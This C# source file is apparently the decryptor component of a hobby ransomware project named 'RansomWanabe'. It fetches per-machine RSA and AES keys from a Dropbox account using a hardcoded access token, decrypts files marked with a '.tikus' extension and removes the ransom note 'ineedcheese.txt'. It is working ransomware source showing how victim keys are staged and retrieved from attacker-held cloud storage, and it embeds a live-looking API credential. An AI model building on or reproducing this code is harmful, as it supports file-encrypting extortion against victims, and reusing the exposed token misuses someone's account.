using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Dropbox.Api;

namespace RansomWanabe
{
    public class Dropbox
    {
        public static string token = "PnVBRiPB-vQAAAAAAAAAAXQgy33NH-zcV0O_NaoOe_8ZZhb985g6yJ5vHmHAf450";

        public static async Task<byte[]> DownloadFile(string folder, string file)
        {
            using (DropboxClient dbx = new DropboxClient(token))
            {
                var remoteFilePath = "/" + folder + "/agent_tikus_storage/" + file;
                using (var response = await dbx.Files.DownloadAsync(remoteFilePath))
                {
                    var s = response.GetContentAsByteArrayAsync();
                    s.Wait();
                    var d = s.Result;
                    return d;
                }
            }
        }
    }

    public class Asymmetric
    {

        public class RSA
        {
            /// <summary>
            /// Create a public and private key.
            ///
            /// The RSACryptoServiceProvider supports key sizes from 384
            /// bits to 16384 bits in increments of 8 bits if you have the
            /// Microsoft Enhanced Cryptographic Provider installed. It
            /// supports key sizes from 384 bits to 512 bits in increments
            /// of 8 bits if you have the Microsoft Base Cryptographic
            /// Provider installed.
            /// </summary>
            /// <param name="publicKey">The created public key.</param>
            /// <param name="privateKey">The created private key.</param>
            /// <param name="keySize">Size of keys.</param>
            public static void CreateKeys(out string publicKey, out string privateKey, int keySize = 4096)
            {
                publicKey = null;
                privateKey = null;

                var csp = new CspParameters
                {
                    ProviderType = 1,
                    Flags = CspProviderFlags.UseArchivableKey,
                    KeyNumber = (int)KeyNumber.Exchange
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(keySize, csp);

                publicKey = rsa.ToXmlString(false);
                privateKey = rsa.ToXmlString(true);

                rsa.PersistKeyInCsp = false;
            }

            /// <summary>
            /// Encrypt data using a public key.
            /// </summary>
            /// <param name="bytes">Bytes to encrypt.</param>
            /// <param name="publicKey">Public key to use.</param>
            /// <returns>Encrypted data.</returns>
            public static byte[] Encrypt(byte[] bytes, string publicKey)
            {
                var csp = new CspParameters
                {
                    ProviderType = 1
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);

                rsa.FromXmlString(publicKey);
                var data = rsa.Encrypt(bytes, false);

                rsa.PersistKeyInCsp = false;

                return data;
            }

            /// <summary>
            /// Encrypt data using a public key.
            /// </summary>
            /// <param name="input">Data to encrypt.</param>
            /// <param name="publicKey">Public key to use.</param>
            /// <returns>Encrypted data.</returns>
            public static string Encrypt(string input, string publicKey)
            {
                if (input == null)
                {
                    throw new Exception("Input cannot be null");
                }

                return Convert.ToBase64String(
                    Encrypt(
                        Encoding.UTF8.GetBytes(input),
                        publicKey));
            }

            /// <summary>
            /// Decrypt data using a private key.
            /// </summary>
            /// <param name="bytes">Bytes to decrypt.</param>
            /// <param name="privateKey">Private key to use.</param>
            /// <returns>Decrypted data.</returns>
            public static byte[] Decrypt(byte[] bytes, string privateKey)
            {
                var csp = new CspParameters
                {
                    ProviderType = 1
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);

                rsa.FromXmlString(privateKey);
                var data = rsa.Decrypt(bytes, false);

                rsa.PersistKeyInCsp = false;

                return data;
            }

            /// <summary>
            /// Decrypt data using a private key.
            /// </summary>
            /// <param name="input">Base64 data to decrypt.</param>
            /// <param name="privateKey">Private key to use.</param>
            /// <returns>Decrypted data.</returns>
            public static string Decrypt(string input, string privateKey)
            {
                if (input == null)
                {
                    throw new Exception("Input cannot be null");
                }

                return Encoding.UTF8.GetString(
                    Decrypt(
                        Convert.FromBase64String(input),
                        privateKey));
            }
        }
    }

    public class GetKey
    {
        public static string GetPublicKey()
        {
            var publicKey = File.ReadAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "public.key"));
            return publicKey;
        }

        public static string GetPrivateKey()
        {
            //get key online

            Task<byte[]> task = Task.Run(() => Dropbox.DownloadFile(Environment.MachineName, "private.key"));
            task.Wait();

            var privateKey = Encoding.UTF8.GetString(task.Result);

            //var privateKey = File.ReadAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "private.key"));
            //var privateKey = Encoding.UTF8.GetString(privKey);
            
            return privateKey;
        }

        public static byte[] GetAESKey()
        {
            Task<byte[]> task = Task.Run(() => Dropbox.DownloadFile(Environment.MachineName, "aes.key"));
            task.Wait();

            var aeskey = task.Result;

            //var aeskey = File.ReadAllBytes(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "aes.key"));
            //var aeskey = Encoding.UTF8.GetString(privKey);

            return aeskey;
        }

        public static byte[] GetAESIV()
        {
            Task<byte[]> task = Task.Run(() => Dropbox.DownloadFile(Environment.MachineName, "aes.iv"));
            task.Wait();

            var aesiv = task.Result;

            //var aesiv = File.ReadAllBytes(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "aes.iv"));
            return aesiv;
        }
    }

    public class AES
    {
        public static byte[] AESDecrypt(byte[] cipherData, byte[] aes_key, byte[] aes_iv)
        {

            MemoryStream ms = new MemoryStream();

            Rijndael alg = Rijndael.Create();

            alg.Key = aes_key;
            alg.IV = aes_iv;

            CryptoStream cs = new CryptoStream(ms,
                alg.CreateDecryptor(), CryptoStreamMode.Write);

            cs.Write(cipherData, 0, cipherData.Length);

            cs.Close();

            byte[] decryptedData = ms.ToArray();

            return decryptedData;
        }
    }

    class Program
    {
        public static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
            {
                dstream.CopyTo(output);
            }
            return output.ToArray();
        }

        static void Main(string[] args)
        {
            //var publicKey = GetKey.GetPublicKey();

            var privateKey = GetKey.GetPrivateKey();

            byte[] aes_key = Asymmetric.RSA.Decrypt(GetKey.GetAESKey(), privateKey);

            byte[] aes_iv = Asymmetric.RSA.Decrypt(GetKey.GetAESIV(), privateKey);

            var baseDir = @"C:\Users\REUSER\Desktop\teloq";

            string ransomFormat = ".tikus";

        var blockList = new List<string> { "exe", "tikus", "key", "pub" };

            var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories);

            var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            var computerName = Environment.MachineName;

            byte[] encrypted;

            //decrypt with this
            foreach (var file in targetDirs.Where(x=> x.EndsWith(ransomFormat)))
            {
                var decryptedFile = Path.Combine(baseDir, $"{Path.GetFileNameWithoutExtension(file)}");
                var outputFile = Path.Combine(Path.GetDirectoryName(file), Path.GetFileNameWithoutExtension(file));
                var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";

                if (!File.Exists(decryptedFile))
                {
                    var fileContent = File.ReadAllBytes(file);
                    
                    File.Delete(file);
                    
                    //var decrypted = Decompress(Asymmetric.RSA.Decrypt(fileContent, privateKey));
                    var decrypted = AES.AESDecrypt(fileContent, aes_key, aes_iv);
                    
                    File.WriteAllBytes(outputFile, decrypted);

                    if (File.Exists(ransomNotePath))
                        File.Delete(ransomNotePath);
                    
                }

            }


        }
    }
}
